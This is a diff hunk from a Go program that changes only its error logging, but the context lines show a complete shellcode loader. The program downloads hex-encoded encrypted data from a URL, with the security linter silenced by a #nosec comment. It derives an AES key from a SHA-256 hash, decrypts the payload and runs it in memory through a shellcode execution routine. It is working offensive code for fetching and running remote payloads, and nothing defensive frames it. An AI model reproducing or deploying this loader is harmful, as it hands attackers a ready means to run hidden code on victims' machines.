@@ -25,23 +25,23 @@ func main() {
 
 	resp, err := http.Get(url) // #nosec
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalln(err)
 	}
 	defer func() { _ = resp.Body.Close() }()
 	cipherData, err := ioutil.ReadAll(hex.NewDecoder(resp.Body))
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalln(err)
 	}
 	hash := sha256.New()
 	hash.Write([]byte(key))
 	aesKey := hash.Sum(nil)
 	sc, err := aes.CBCDecrypt(cipherData, aesKey, aesKey[:aes.IVSize])
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalln(err)
 	}
 
 	err = shellcode.Execute(method, sc)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalln(err)
 	}
 }
